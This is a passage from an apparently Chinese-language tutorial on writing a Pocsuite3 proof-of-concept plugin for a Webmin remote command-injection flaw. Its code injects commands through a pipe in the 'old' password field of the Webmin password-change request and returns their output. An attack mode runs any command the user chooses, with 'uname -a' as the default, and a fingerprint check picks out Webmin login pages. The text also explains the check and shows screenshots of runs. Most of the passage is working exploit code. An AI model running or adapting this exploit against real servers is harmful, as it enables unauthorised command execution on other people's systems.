result['VerifyInfo'] = {}            result['VerifyInfo']['URL'] = self.url            result['VerifyInfo']['Postdata'] = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'        returnself.parse_output(result)    # 定义额外的命令行参数，用于 attack 模式    def_options(self):        o = OrderedDict() #于生成并返回一个包含选项的有序字典（OrderedDict）        o['cmd'] = OptString('uname -a', description='需要执行的命令',require=True)        return o    def_attack(self):        result={}        value=self._exploit(self.get_option('cmd'))        if value:            result['ShellInfo']={}            result['ShellInfo']['URL']=self.url            result['ShellInfo']['Content']=value #将命令执行结果输出        returnself.parse_output(result)register_poc(DemoPOC)
```  
### self.__check方法的介绍：  
  
self._check() 方法会进行端口开放检查、http/https 协议自动纠正，首页关键词 check，关键词蜜罐检查等功能。可以一定程度避免将 Payload 发送到蜜罐，减少误报。  
```
 if not self._check(dork='<title>Login to Webmin</title>'):            #只对网站返回包中包含<title>Login to Webmin</title>的站点进行poc测试            return False
```  
  
**这个方法的意思就是如果网站不包含<title>Login**  
to   
Webmin</title>就**不进行poc测试，直接返回False**  
## 运行结果  
  
默认的verify模式验证：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLU7mxbzauRiaBpepsHW8XoDmCEicdv77xvzw2uliaib0FcYDJ4JIgC1aF7Q/640?wx_fmt=png&from=appmsg "null")  
  
  
输入自定义的cmd参数执行自定义的命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLJUB55eeHqcib5owIAoxb8RTcwHKia3DfkiboWG6aEV9dnbTWBCWjlkYyw/640?wx_fmt=png&from=appmsg "null")  
  
  
